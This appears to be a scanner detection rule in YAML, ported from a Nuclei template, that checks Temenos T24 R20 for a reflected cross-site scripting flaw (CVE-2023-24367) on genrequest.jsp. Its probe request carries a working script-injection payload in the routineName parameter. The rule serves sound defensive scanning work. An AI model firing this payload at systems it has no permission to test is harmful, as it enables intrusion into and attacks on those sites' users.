schema_version: 1
id: "cortex.community:temenos-t24-xss"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Temenos T24 R20 - Cross-Site Scripting"
  description: "Temenos T24 release 20 contains a reflected cross-site scripting vulnerability via the routineName parameter at genrequest.jsp. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://github.com/mrojz/T24/blob/main/CVE-2023-24367.md"
    - "https://github.com/mrojz/T24/blob/main/T24_XSS.md"
    - "https://nvd.nist.gov/vuln/detail/CVE-2023-24367"
    - "https://github.com/ARPSyndicate/cvemon"
    - "https://github.com/mrojz/T24"
  cwes: [79]
  tags: ["xss", "temenos", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "Medium"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/jsps/genrequest.jsp?routineName=\"><script>alert(document.domain)</script>" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<script>alert(document.domain)</script>" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<title>Processing...</title>" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
